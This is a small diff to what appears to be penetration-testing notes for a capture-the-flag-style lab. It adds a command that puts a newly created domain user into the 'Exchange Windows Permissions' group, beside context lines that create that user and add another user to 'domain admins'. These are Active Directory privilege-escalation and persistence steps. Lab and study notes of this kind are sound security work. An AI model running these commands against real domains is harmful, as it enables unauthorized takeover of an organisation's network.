@@ -36,6 +36,8 @@ add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.
 net user svc-alfresco /domain
 
 net user buser Passw0rd /add /domain
+
+net group "Exchange Windows Permissions" buser /add
 ```
 CyberChef
 ```
